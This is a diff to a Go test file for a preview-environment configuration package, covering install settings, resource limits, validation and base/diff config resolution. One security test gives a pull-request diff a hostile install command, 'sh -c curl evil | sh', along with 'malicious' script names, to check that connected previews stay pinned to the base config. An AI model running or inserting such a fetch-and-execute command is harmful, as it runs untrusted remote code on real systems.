@@ -2,9 +2,11 @@ package preview
 
 import (
 	"encoding/json"
+	"fmt"
 	"os"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"testing"
 
 	"github.com/assembledhq/143/internal/models"
@@ -91,6 +93,133 @@ func TestParseConfig_MultiService(t *testing.T) {
 	}
 }
 
+func TestInspectConfigOptions(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name     string
+		raw      string
+		selected string
+		expected ConfigOptions
+	}{
+		{
+			name: "single preview config does not require selection",
+			raw: `{
+				"preview": {
+					"name": "web",
+					"command": ["npm", "run", "dev"],
+					"port": 3000
+				}
+			}`,
+			expected: ConfigOptions{
+				Names:        []string{"web"},
+				SelectedName: "web",
+			},
+		},
+		{
+			name: "multi config uses default",
+			raw: `{
+				"preview": {
+					"default": "web",
+					"configs": {
+						"docs": {"name": "docs", "command": ["npm", "run", "docs"], "port": 3001},
+						"web": {"name": "web", "command": ["npm", "run", "dev"], "port": 3000}
+					}
+				}
+			}`,
+			expected: ConfigOptions{
+				Names:        []string{"docs", "web"},
+				DefaultName:  "web",
+				SelectedName: "web",
+			},
+		},
+		{
+			name: "multi config without default requires selection",
+			raw: `{
+				"preview": {
+					"configs": {
+						"api": {"name": "api", "command": ["go", "run", "."], "port": 8080},
+						"web": {"name": "web", "command": ["npm", "run", "dev"], "port": 3000}
+					}
+				}
+			}`,
+			expected: ConfigOptions{
+				Names:             []string{"api", "web"},
+				RequiresSelection: true,
+			},
+		},
+		{
+			name:     "selected config is preserved",
+			selected: "api",
+			raw: `{
+				"preview": {
+					"default": "web",
+					"configs": {
+						"api": {"name": "api", "command": ["go", "run", "."], "port": 8080},
+						"web": {"name": "web", "command": ["npm", "run", "dev"], "port": 3000}
+					}
+				}
+			}`,
+			expected: ConfigOptions{
+				Names:        []string{"api", "web"},
+				DefaultName:  "web",
+				SelectedName: "api",
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			actual, err := InspectConfigOptions([]byte(tt.raw), tt.selected)
+			require.NoError(t, err, "InspectConfigOptions should parse valid preview config metadata")
+			require.Equal(t, tt.expected, actual, "InspectConfigOptions should return exact config selection metadata")
+		})
+	}
+}
+
+func TestParseConfig_AcceptsNumericVersionMarker(t *testing.T) {
+	t.Parallel()
+
+	raw := `{
+		"preview": {
+			"version": 1,
+			"name": "Full Stack",
+			"primary": "frontend",
+			"services": {
+				"frontend": {
+					"command": ["npm", "run", "dev"],
+					"port": 3000,
+					"ready": {"http_path": "/", "timeout_seconds": 90}
+				}
+			},
+			"credentials": {"mode": "none"},
+			"network": {"mode": "managed"}
+		}
+	}`
+
+	cfg, err := ParseConfig([]byte(raw))
+	require.NoError(t, err, "ParseConfig should accept numeric preview.version markers from committed repo configs")
+	require.Equal(t, "1", cfg.Version, "ParseConfig should preserve a numeric version marker as its JSON text")
+	require.Equal(t, "frontend", cfg.Primary, "ParseConfig should still parse the rest of the preview section")
+}
+
+func TestInvalidConfigMessage(t *testing.T) {
+	t.Parallel()
+
+	err := fmt.Errorf("%w: parse .143/config.json: parse preview config: invalid character 'n' looking for beginning of object key string", ErrInvalidConfig)
+
+	msg := InvalidConfigMessage(err)
+
+	require.Equal(
+		t,
+		"Invalid .143/config.json preview config: parse preview config: invalid character 'n' looking for beginning of object key string. Fix the committed config and start preview again.",
+		msg,
+		"InvalidConfigMessage should include the specific config failure and a recovery action without duplicating path prefixes",
+	)
+}
+
 func TestParseConfig_WithInfrastructure(t *testing.T) {
 	t.Parallel()
 
@@ -157,6 +286,86 @@ func TestParseConfig_FromRepoConfigPreviewSection(t *testing.T) {
 	require.NoError(t, err, "ParseConfig should accept nested preview config inside .143/config.json")
 	require.Equal(t, "web", cfg.Primary, "ParseConfig should parse the nested preview section")
 	require.Contains(t, cfg.Services, "web", "ParseConfig should preserve services from the nested preview section")
+}
+
+func TestParseConfig_WithPreviewInstall(t *testing.T) {
+	t.Parallel()
+
+	raw := `{
+		"preview": {
+			"version": "3",
+			"name": "dogfood",
+			"primary": "web",
+			"install": {
+				"command": ["npm", "ci", "--no-audit", "--no-fund"],
+				"cwd": ".",
+				"lockfiles": ["package-lock.json"],
+				"clean_paths": ["node_modules", "packages/*/node_modules"],
+				"verify_paths": ["node_modules/.bin/next"]
+			},
+			"services": {
+				"web": {
+					"command": ["npm", "run", "dev"],
+					"port": 3000,
+					"ready": {"http_path": "/"}
+				}
+			},
+			"credentials": {"mode": "none"},
+			"network": {"mode": "managed"}
+		}
+	}`
+
+	cfg, err := ParseConfig([]byte(raw))
+	require.NoError(t, err, "ParseConfig should accept preview.install")
+	require.NotNil(t, cfg.Install, "ParseConfig should preserve preview.install")
+	require.Equal(t, []string{"npm", "ci", "--no-audit", "--no-fund"}, cfg.Install.Command, "install command should round-trip")
+	require.Equal(t, ".", cfg.Install.Cwd, "install cwd should round-trip")
+	require.Equal(t, []string{"package-lock.json"}, cfg.Install.Lockfiles, "install lockfiles should round-trip")
+	require.Equal(t, []string{"node_modules", "packages/*/node_modules"}, cfg.Install.CleanPaths, "install clean paths should round-trip")
+	require.Equal(t, []string{"node_modules/.bin/next"}, cfg.Install.VerifyPaths, "install verify paths should round-trip")
+	require.Equal(t, DefaultInstallTimeoutSeconds, cfg.Install.TimeoutSeconds, "install timeout should default when omitted")
+}
+
+func TestParseConfig_WithResources(t *testing.T) {
+	t.Parallel()
+
+	raw := `{
+		"preview": {
+			"version": "1",
+			"name": "Full Stack",
+			"primary": "frontend",
+			"resources": {
+				"requests": {
+					"cpu": "500m",
+					"memory": "768Mi",
+					"ephemeral-storage": "5Gi"
+				},
+				"limits": {
+					"cpu": "1.5",
+					"memory": "1Gi",
+					"ephemeral-storage": "10gb"
+				}
+			},
+			"services": {
+				"frontend": {
+					"command": ["npm", "run", "dev"],
+					"port": 3000,
+					"ready": {"http_path": "/"}
+				}
+			},
+			"credentials": {"mode": "none"},
+			"network": {"mode": "managed"}
+		}
+	}`
+
+	cfg, err := ParseConfig([]byte(raw))
+	require.NoError(t, err, "ParseConfig should accept Kubernetes-style preview resources")
+	require.Equal(t, "500m", cfg.Resources.Requests.CPU, "ParseConfig should preserve requested CPU quantity")
+	require.Equal(t, "768Mi", cfg.Resources.Requests.Memory, "ParseConfig should preserve requested memory quantity")
+	require.Equal(t, "5Gi", cfg.Resources.Requests.EphemeralStorage, "ParseConfig should preserve requested storage quantity")
+	require.Equal(t, "1.5", cfg.Resources.Limits.CPU, "ParseConfig should preserve limit CPU quantity")
+	require.Equal(t, "1Gi", cfg.Resources.Limits.Memory, "ParseConfig should preserve limit memory quantity")
+	require.Equal(t, "10gb", cfg.Resources.Limits.EphemeralStorage, "ParseConfig should preserve limit storage quantity")
 }
 
 func TestDogfoodPreviewConfig_ServerUsesRegisteredReadinessPath(t *testing.T) {
@@ -442,6 +651,204 @@ func TestValidateConfig(t *testing.T) {
 	}
 }
 
+func TestValidateConfig_PreviewInstall(t *testing.T) {
+	t.Parallel()
+
+	base := func(install *models.PreviewInstallConfig) models.PreviewConfig {
+		return models.PreviewConfig{
+			Primary:        "app",
+			Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
+			Infrastructure: map[string]models.InfrastructureConfig{},
+			Install:        install,
+		}
+	}
+
+	tests := []struct {
+		name       string
+		install    *models.PreviewInstallConfig
+		wantErrSub string
+	}{
+		{
+			name: "valid npm workspace install",
+			install: &models.PreviewInstallConfig{
+				Command:        []string{"npm", "ci", "--no-audit", "--no-fund"},
+				Cwd:            ".",
+				Lockfiles:      []string{"package-lock.json"},
+				CleanPaths:     []string{"node_modules", "packages/*/node_modules"},
+				VerifyPaths:    []string{"node_modules/.bin/next"},
+				TimeoutSeconds: 420,
+			},
+		},
+		{
+			name:       "missing command",
+			install:    &models.PreviewInstallConfig{Lockfiles: []string{"package-lock.json"}},
+			wantErrSub: "preview.install.command is required",
+		},
+		{
+			name:       "empty lockfiles",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, Lockfiles: []string{""}},
+			wantErrSub: "preview.install.lockfiles[0] is required",
+		},
+		{
+			name:       "empty clean path",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, CleanPaths: []string{""}},
+			wantErrSub: "preview.install.clean_paths[0] is required",
+		},
+		{
+			name:       "unsafe cwd",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, Cwd: "../outside"},
+			wantErrSub: "preview.install.cwd",
+		},
+		{
+			name:       "unsafe clean path",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, CleanPaths: []string{"/tmp/node_modules"}},
+			wantErrSub: "preview.install.clean_paths[0]",
+		},
+		{
+			name:       "invalid timeout",
+			install:    &models.PreviewInstallConfig{Command: []string{"npm", "ci"}, TimeoutSeconds: MaxInstallTimeoutSeconds + 1},
+			wantErrSub: "preview.install.timeout_seconds",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			cfg := base(tt.install)
+			errs := ValidateConfig(&cfg)
+			if tt.wantErrSub == "" {
+				require.Empty(t, errs, "valid preview.install should pass validation")
+				return
+			}
+			require.NotEmpty(t, errs, "invalid preview.install should return a validation error")
+			require.Contains(t, strings.Join(errs, "\n"), tt.wantErrSub, "validation errors should identify the invalid preview.install field")
+		})
+	}
+}
+
+func TestValidateConfig_Resources(t *testing.T) {
+	t.Parallel()
+
+	base := func(resources models.PreviewResourceRequirements) models.PreviewConfig {
+		return models.PreviewConfig{
+			Primary:        "app",
+			Services:       map[string]models.ServiceConfig{"app": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}}},
+			Infrastructure: map[string]models.InfrastructureConfig{},
+			Resources:      resources,
+		}
+	}
+
+	tests := []struct {
+		name       string
+		resources  models.PreviewResourceRequirements
+		wantErrSub string
+	}{
+		{
+			name: "valid requests and limits",
+			resources: models.PreviewResourceRequirements{
+				Requests: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
+				Limits:   models.PreviewResourceList{CPU: "1", Memory: "1Gi", EphemeralStorage: "10Gi"},
+			},
+		},
+		{
+			name:       "invalid memory unit",
+			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{Memory: "1parsec"}},
+			wantErrSub: "preview.resources.limits.memory",
+		},
+		{
+			name:       "zero cpu",
+			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{CPU: "0"}},
+			wantErrSub: "preview.resources.limits.cpu",
+		},
+		{
+			name:       "negative storage",
+			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{EphemeralStorage: "-1Gi"}},
+			wantErrSub: "preview.resources.limits.ephemeral-storage",
+		},
+		{
+			name:       "memory exceeds cap",
+			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{Memory: "2Gi"}},
+			wantErrSub: "at most 1Gi",
+		},
+		{
+			name:       "storage exceeds cap",
+			resources:  models.PreviewResourceRequirements{Limits: models.PreviewResourceList{EphemeralStorage: "11Gi"}},
+			wantErrSub: "at most 10Gi",
+		},
+		{
+			name: "request exceeds limit",
+			resources: models.PreviewResourceRequirements{
+				Requests: models.PreviewResourceList{CPU: "1500m", Memory: "768Mi", EphemeralStorage: "6Gi"},
+				Limits:   models.PreviewResourceList{CPU: "1", Memory: "512Mi", EphemeralStorage: "5Gi"},
+			},
+			wantErrSub: "must be less than or equal to",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			cfg := base(tt.resources)
+			errs := ValidateConfig(&cfg)
+			if tt.wantErrSub == "" {
+				require.Empty(t, errs, "valid preview resources should pass validation")
+				return
+			}
+			require.NotEmpty(t, errs, "invalid preview resources should return validation errors")
+			require.Contains(t, strings.Join(errs, "\n"), tt.wantErrSub, "validation errors should identify the invalid preview resource")
+		})
+	}
+}
+
+func TestParseByteQuantityMiB(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name     string
+		raw      string
+		expected int
+	}{
+		{name: "mebibytes", raw: "512Mi", expected: 512},
+		{name: "gibibytes", raw: "1Gi", expected: 1024},
+		{name: "decimal megabytes", raw: "500mb", expected: 477},
+		{name: "decimal gigabytes", raw: "5gb", expected: 4769},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			actual, ok, err := parseByteQuantityMiB("test.quantity", tt.raw)
+			require.NoError(t, err, "byte quantity should parse")
+			require.True(t, ok, "byte quantity should be treated as set")
+			require.Equal(t, tt.expected, actual, "byte quantity should normalize to MiB")
+		})
+	}
+}
+
+func TestParseCPUQuantity(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name     string
+		raw      string
+		expected int
+	}{
+		{name: "millicores", raw: "500m", expected: 500},
+		{name: "whole core", raw: "1", expected: 1000},
+		{name: "fractional cores", raw: "1.5", expected: 1500},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			actual, ok, err := parseCPUQuantity("test.cpu", tt.raw)
+			require.NoError(t, err, "CPU quantity should parse")
+			require.True(t, ok, "CPU quantity should be treated as set")
+			require.Equal(t, tt.expected, actual, "CPU quantity should normalize to millicores")
+		})
+	}
+}
+
 func TestResolveConfig_NonConnected(t *testing.T) {
 	t.Parallel()
 
@@ -449,6 +856,11 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 		Version: "3",
 		Name:    "Test",
 		Primary: "frontend",
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"npm", "ci"},
+			Lockfiles:  []string{"package-lock.json"},
+			CleanPaths: []string{"node_modules"},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
 			"backend":  {Command: []string{"python", "app.py"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
@@ -456,11 +868,20 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 		Infrastructure: map[string]models.InfrastructureConfig{
 			"db": {Template: "postgres-16", InitScript: "db/base_seed.sql", InjectInto: []string{"backend"}},
 		},
+		Resources: models.PreviewResourceRequirements{
+			Limits: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
+		},
 		Credentials: models.CredentialConfig{Mode: "none"},
 		Network:     models.NetworkConfig{Mode: "managed"},
 	}
 
 	diffCfg := &models.PreviewConfig{
+		Install: &models.PreviewInstallConfig{
+			Command:     []string{"pnpm", "install", "--frozen-lockfile"},
+			Lockfiles:   []string{"pnpm-lock.yaml"},
+			CleanPaths:  []string{"node_modules", "apps/*/node_modules"},
+			VerifyPaths: []string{"node_modules/.bin/next"},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "run", "dev"}, Port: 3000, Cwd: "frontend", Ready: models.ReadinessProbe{HTTPPath: "/", TimeoutSeconds: 120}},
 			"backend":  {Command: []string{"python", "app.py", "--debug"}, Port: 4000, Ready: models.ReadinessProbe{HTTPPath: "/health"}},
@@ -468,9 +889,13 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 		Infrastructure: map[string]models.InfrastructureConfig{
 			"db": {Template: "postgres-16", InitScript: "db/test_seed.sql"},
 		},
+		Resources: models.PreviewResourceRequirements{
+			Limits: models.PreviewResourceList{CPU: "1", Memory: "768Mi", EphemeralStorage: "10Gi"},
+		},
 	}
 
-	resolved := ResolveConfig(baseCfg, diffCfg)
+	resolved, err := ResolveConfig(baseCfg, diffCfg)
+	require.NoError(t, err, "ResolveConfig should succeed for valid configs")
 
 	// Primary comes from base.
 	if resolved.Primary != "frontend" {
@@ -507,6 +932,11 @@ func TestResolveConfig_NonConnected(t *testing.T) {
 	if len(db.InjectInto) != 1 || db.InjectInto[0] != "backend" {
 		t.Errorf("db.InjectInto = %v, want [backend] (from base)", db.InjectInto)
 	}
+
+	require.NotNil(t, resolved.Install, "non-connected preview should allow diff install behavior")
+	require.Equal(t, []string{"pnpm", "install", "--frozen-lockfile"}, resolved.Install.Command, "non-connected preview should use install command from diff")
+	require.Equal(t, []string{"apps/*/node_modules"}, resolved.Install.CleanPaths[1:], "non-connected preview should use install cleanup paths from diff")
+	require.Equal(t, diffCfg.Resources, resolved.Resources, "non-connected preview should use resource requirements from diff")
 }
 
 func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
@@ -515,26 +945,42 @@ func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
 	baseCfg := &models.PreviewConfig{
 		Version: "3",
 		Primary: "frontend",
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"npm", "ci"},
+			Lockfiles:  []string{"package-lock.json"},
+			CleanPaths: []string{"node_modules"},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "start"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
 		},
 		Infrastructure: map[string]models.InfrastructureConfig{
 			"db": {Template: "postgres-16", InitScript: "db/base_seed.sql"},
 		},
+		Resources: models.PreviewResourceRequirements{
+			Limits: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
+		},
 		Credentials: models.CredentialConfig{Mode: "managed_env", CredentialSet: "staging"},
 		Network:     models.NetworkConfig{Mode: "managed", Destinations: []string{"staging_db"}},
 	}
 
 	diffCfg := &models.PreviewConfig{
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"sh", "-c", "curl evil | sh"},
+			CleanPaths: []string{"."},
+		},
 		Services: map[string]models.ServiceConfig{
 			"frontend": {Command: []string{"npm", "run", "malicious"}, Port: 9999, Cwd: "/etc"},
 		},
 		Infrastructure: map[string]models.InfrastructureConfig{
 			"db": {Template: "postgres-16", InitScript: "db/malicious.sql"},
 		},
+		Resources: models.PreviewResourceRequirements{
+			Limits: models.PreviewResourceList{CPU: "2", Memory: "1Gi", EphemeralStorage: "10Gi"},
+		},
 	}
 
-	resolved := ResolveConfig(baseCfg, diffCfg)
+	resolved, err := ResolveConfig(baseCfg, diffCfg)
+	require.NoError(t, err, "ResolveConfig should succeed for valid configs")
 
 	// All service fields pinned to base.
 	fe := resolved.Services["frontend"]
@@ -550,6 +996,10 @@ func TestResolveConfig_Connected_PinsEverythingToBase(t *testing.T) {
 	if db.InitScript != "db/base_seed.sql" {
 		t.Errorf("InitScript = %q, want %q (pinned to base for connected)", db.InitScript, "db/base_seed.sql")
 	}
+
+	require.NotNil(t, resolved.Install, "connected preview should preserve base install config")
+	require.Equal(t, []string{"npm", "ci"}, resolved.Install.Command, "connected preview should pin install command to base")
+	require.Equal(t, baseCfg.Resources, resolved.Resources, "connected preview should pin resource requirements to base")
 }
 
 func TestResolveConfig_DiffCannotAddServices(t *testing.T) {
@@ -572,7 +1022,8 @@ func TestResolveConfig_DiffCannotAddServices(t *testing.T) {
 		},
 	}
 
-	resolved := ResolveConfig(baseCfg, diffCfg)
+	resolved, err := ResolveConfig(baseCfg, diffCfg)
+	require.NoError(t, err, "ResolveConfig should succeed for valid configs")
 
 	// Only services from base should exist.
 	if len(resolved.Services) != 1 {
@@ -581,6 +1032,37 @@ func TestResolveConfig_DiffCannotAddServices(t *testing.T) {
 	if _, ok := resolved.Services["sneaked"]; ok {
 		t.Error("diff-added service 'sneaked' should not appear in resolved config")
 	}
+}
+
+func TestResolveConfig_NonConnectedCanRemoveInstall(t *testing.T) {
+	t.Parallel()
+
+	baseCfg := &models.PreviewConfig{
+		Version: "3",
+		Primary: "app",
+		Install: &models.PreviewInstallConfig{
+			Command:    []string{"npm", "ci"},
+			Lockfiles:  []string{"package-lock.json"},
+			CleanPaths: []string{"node_modules"},
+		},
+		Services: map[string]models.ServiceConfig{
+			"app": {Command: []string{"npm"}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
+		},
+		Infrastructure: map[string]models.InfrastructureConfig{},
+		Credentials:    models.CredentialConfig{Mode: "none"},
+	}
+	diffCfg := &models.PreviewConfig{
+		Services: map[string]models.ServiceConfig{
+			"app": {Command: []string{"go", "run", "."}, Port: 3000, Ready: models.ReadinessProbe{HTTPPath: "/"}},
+		},
+		Infrastructure: map[string]models.InfrastructureConfig{},
+	}
+
+	resolved, err := ResolveConfig(baseCfg, diffCfg)
+	require.NoError(t, err, "ResolveConfig should succeed for valid configs")
+
+	require.Nil(t, resolved.Install, "non-connected preview should use nil install from diff instead of keeping stale base install")
+	require.Equal(t, []string{"go", "run", "."}, resolved.Services["app"].Command, "non-connected preview should still resolve runtime service fields from diff")
 }
 
 func TestIsConnected(t *testing.T) {
@@ -696,14 +1178,14 @@ func TestResolveResourceLimits(t *testing.T) {
 			cfg: models.PreviewConfig{
 				Services: map[string]models.ServiceConfig{"app": {}},
 			},
-			expected: models.ResourceLimits{MemoryMB: 512, CPUMillis: 500},
+			expected: models.ResourceLimits{MemoryMiB: 384, CPUMillis: 500, DiskMiB: 10 * 1024},
 		},
 		{
 			name: "multi service without managed infrastructure uses standard preview tier",
 			cfg: models.PreviewConfig{
 				Services: map[string]models.ServiceConfig{"a": {}, "b": {}},
 			},
-			expected: models.ResourceLimits{MemoryMB: 1024, CPUMillis: 1000},
+			expected: models.ResourceLimits{MemoryMiB: 768, CPUMillis: 1000, DiskMiB: 10 * 1024},
 		},
 		{
 			name: "multi service with managed infrastructure uses heavy preview tier",
@@ -713,7 +1195,28 @@ func TestResolveResourceLimits(t *testing.T) {
 					"db": {Template: "postgres-17"},
 				},
 			},
-			expected: models.ResourceLimits{MemoryMB: 2048, CPUMillis: 2000},
+			expected: models.ResourceLimits{MemoryMiB: 1024, CPUMillis: 2000, DiskMiB: 10 * 1024},
+		},
+		{
+			name: "requests override topology defaults when limits are omitted",
+			cfg: models.PreviewConfig{
+				Services: map[string]models.ServiceConfig{"app": {}},
+				Resources: models.PreviewResourceRequirements{
+					Requests: models.PreviewResourceList{CPU: "750m", Memory: "512Mi", EphemeralStorage: "5Gi"},
+				},
+			},
+			expected: models.ResourceLimits{MemoryMiB: 512, CPUMillis: 750, DiskMiB: 5 * 1024},
+		},
+		{
+			name: "limits override requests",
+			cfg: models.PreviewConfig{
+				Services: map[string]models.ServiceConfig{"app": {}},
+				Resources: models.PreviewResourceRequirements{
+					Requests: models.PreviewResourceList{CPU: "500m", Memory: "512Mi", EphemeralStorage: "5Gi"},
+					Limits:   models.PreviewResourceList{CPU: "1.5", Memory: "1Gi", EphemeralStorage: "10gb"},
+				},
+			},
+			expected: models.ResourceLimits{MemoryMiB: 1024, CPUMillis: 1500, DiskMiB: 9537},
 		},
 	}
 
@@ -741,8 +1244,25 @@ func TestApplyResourceLimitsToSandboxConfig(t *testing.T) {
 
 	ApplyResourceLimitsToSandboxConfig(&sandboxCfg, cfg)
 
-	require.Equal(t, 2048, sandboxCfg.MemoryLimitMB, "sandbox config should use the preview topology memory tier")
+	require.Equal(t, 1024, sandboxCfg.MemoryLimitMB, "sandbox config should use the preview topology memory tier")
 	require.Equal(t, 2.0, sandboxCfg.CPULimit, "sandbox config should convert preview millicores into CPU cores")
+	require.Equal(t, 10, sandboxCfg.DiskLimitGB, "sandbox config should round preview disk MiB up to whole GiB")
+}
+
+func TestApplyResourceLimitsToSandboxConfig_RoundsDiskUp(t *testing.T) {
+	t.Parallel()
+
+	cfg := &models.PreviewConfig{
+		Services: map[string]models.ServiceConfig{"app": {}},
+		Resources: models.PreviewResourceRequirements{
+			Limits: models.PreviewResourceList{EphemeralStorage: "1537Mi"},
+		},
+	}
+	sandboxCfg := agent.DefaultSandboxConfig()
+
+	ApplyResourceLimitsToSandboxConfig(&sandboxCfg, cfg)
+
+	require.Equal(t, 2, sandboxCfg.DiskLimitGB, "sandbox config should round non-whole GiB disk limits up for Docker quota support")
 }
 
 func TestLookupInfraTemplate(t *testing.T) {
@@ -834,6 +1354,10 @@ func TestParseConfig_CommittedDogfoodConfig(t *testing.T) {
 			require.True(t, ok, "dogfood preview config should define the frontend service")
 			require.Contains(t, frontend.Env, "NEXT_PUBLIC_API_URL", "dogfood preview should explicitly neutralize public API origin inherited from the surrounding environment")
 			require.Equal(t, "", frontend.Env["NEXT_PUBLIC_API_URL"], "dogfood preview must force same-origin API calls so preview CSRF cookies match the request origin")
+			server, ok := cfg.Services["server"]
+			require.True(t, ok, "dogfood preview config should define the server service")
+			require.Equal(t, "api", server.Env["MODE"], "dogfood preview server should avoid worker mode because the sandbox has no Docker socket")
+			require.Equal(t, "0", server.Env["PREVIEW_GATEWAY_PORT"], "dogfood preview server should disable the nested preview gateway to avoid binding the platform preview port")
 			return
 		}
 		parent := filepath.Dir(dir)
@@ -857,6 +1381,10 @@ func TestCommittedDogfoodFrontendScriptBindsExternally(t *testing.T) {
 			require.NoError(t, err, "test should read committed dogfood frontend preview script")
 			require.Contains(t, string(raw), "HOSTNAME=0.0.0.0", "dogfood Next preview must bind externally so the worker proxy can dial the sandbox IP")
 			require.Contains(t, string(raw), "npm run build", "dogfood Next preview should run a production build before serving")
+			require.Contains(t, string(raw), "package-lock.json", "dogfood Next preview should key dependency install reuse to the lockfile")
+			require.Contains(t, string(raw), ".143-npm-ci-lock", "dogfood Next preview should only skip npm ci after a successful lockfile-matched install marker")
+			require.Contains(t, string(raw), "node_modules/.bin/next", "dogfood Next preview should verify the expected Next binary exists before reusing installed deps")
+			require.Contains(t, string(raw), "rm -rf node_modules", "dogfood Next preview should clean partial dependency installs before retrying npm ci")
 			require.Contains(t, string(raw), "cp -R .next/static .next/standalone/frontend/.next/static", "dogfood Next preview should stage generated CSS and other static chunks next to the standalone server")
 			require.Contains(t, string(raw), "cp -R public .next/standalone/frontend/public", "dogfood Next preview should stage public assets next to the standalone server")
 			require.Contains(t, string(raw), "node .next/standalone/frontend/server.js", "dogfood Next preview should serve the standalone production build")
